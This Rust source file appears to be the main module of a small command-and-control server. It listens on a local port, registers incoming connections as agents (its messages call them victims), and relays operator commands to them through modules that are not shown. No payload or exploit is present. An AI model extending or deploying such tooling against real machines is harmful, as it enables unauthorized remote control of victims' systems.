// Dependecies
use std::{io::{self, Write}, net::{Shutdown, TcpListener, TcpStream}, sync::{Arc, mpsc::{Receiver, Sender}}, thread::{self, sleep}};
// use rustyline::error::ReadlineError;
use rustyline::{DefaultEditor};
use core::time;


// Internal modules
mod constants;
mod commands;
mod c2_state;

use constants::{RESET, DIM, BOLD, WHITE, GREEN, YELLOW, RED, CYAN, UiEvent};
use c2_state::C2State;


pub fn build_prompt(state: &C2State) -> (String, String) {
    let count = state.agent_count();
    let module = state.current_mod();

    let agents_color = match count {
        0 => RED,
        1..=4 => YELLOW,
        _ => CYAN,
    };

    let raw = format!(
        "C&C [agents:{count}] [mod:{module}] ❯ "
    );

    let styled = format!(
        "{BOLD}{RED}C&C{RESET} \
         {DIM}[{RESET}{agents_color}agents:{count}{RESET}{DIM}]{RESET} \
         {DIM}[{RESET}{WHITE}mod:{module}{RESET}{DIM}]{RESET} \
         {BOLD}{CYAN}❯{RESET} "
    );

    (raw, styled)
}

fn handle_client_instruct(instruct: &str, conn: &mut TcpStream) -> Result<bool, String> {
    commands::dispatch_client(instruct, conn)
}

fn handle_server_instruct(instruct: Vec<&str>) -> Result<bool, String> {
    commands::dispatch_server(instruct)
}


fn handle_client(mut conn: TcpStream, state: &C2State) -> Result<(), String>{
    // let mut buff = [0; 1024];
    let mut instruct = String::new();
    let mut rl = DefaultEditor::new().map_err(|e| e.to_string())?;

    loop {
        instruct.clear(); // Clear the buffer

        // Read from CLI 
        let prompt = build_prompt(&state);
        let instruct = rl.readline(&prompt).map_err(|e| e.to_string())?;

        if instruct.trim().to_ascii_lowercase() == "q" || instruct.trim().to_ascii_lowercase() == "exit" {
            conn.write_all(b"q").map_err(|e| e.to_string())?;
            conn.shutdown(Shutdown::Both).map_err(|e| e.to_string())?;
            break;
        }
        
        match handle_client_instruct(instruct.trim(), &mut conn) {
            Ok(b) if b => "",
            Err(err) => { println!("An error has ocurred: {}", err); break; }
            _ => break
        };
    }
    
    Ok(())
}


fn handle_new_connection(state: Arc<C2State>, ui_tx: Sender<UiEvent>) {
    let listener = TcpListener::bind("127.0.0.1:1337")
        .expect("the port can not be opened...");

    println!("\n\t{DIM}[{RESET}{WHITE}listening:{RESET}{DIM}]{RESET} {CYAN}port 1337{RESET}\n");

    for stream in listener.incoming(){
        match stream {
            Ok(conn) =>  {
                
                // Add address to agent state
                let Some(addr) = conn.peer_addr().ok() else {
                    eprintln!("{}[!]{} No se pudo obtener peer_addr", RED, RESET);
                    return;
                };

                state.add_agent(&addr.to_string(), conn);
                let _ = ui_tx.send(UiEvent::AgentConnected(addr.to_string()));
            },
            Err(error) => {
                eprintln!("Error accepting victim: {}", error)
            }
        }
    }
}


fn handle_sessions(state: Arc<C2State>, ui_rx: Receiver<UiEvent>) -> Result<(), String> { 
    let mut rl = DefaultEditor::new().map_err(|e| e.to_string())?;

    loop {
        // Consume all events
        while let Ok(event) = ui_rx.try_recv() {
            match event {
                UiEvent::AgentConnected(addr) => {
                    println!("\n\t{DIM}[{RESET}{GREEN}conn{RESET}{DIM}]{RESET} {WHITE}{}{RESET}\n", addr);
                }
            }
        }

        // Read from CLI
        let prompt = build_prompt(&state);
        let instruct = rl.readline(&prompt).map_err(|e| e.to_string())?;

        if instruct.trim().eq_ignore_ascii_case("q") 
            || instruct.trim().eq_ignore_ascii_case("exit") 
        {
            return Ok(());
        }

        if !instruct.trim().is_empty() {
            let _ = rl.add_history_entry(instruct.as_str());
        }
        
        match handle_server_instruct(instruct.trim().split_whitespace().collect()) {
            Ok(true) => {}
            Err(err) => { println!("An error has ocurred: {}", err); break; }
            _ => break
        };
    }

    Ok(())
}


fn main() {
    let state: Arc<C2State> = Arc::new(C2State::new());
    let listener_state = Arc::clone(&state);
    let (ui_tx, ui_rx) = std::sync::mpsc::channel::<constants::UiEvent>();

    // Create thread of new connections
    thread::spawn(move || {  handle_new_connection(listener_state, ui_tx)});
    sleep(time::Duration::from_millis(200));

    if let Err(err) = handle_sessions(state, ui_rx) {
        eprintln!("An error has ocurred: {}", err);
    }   
}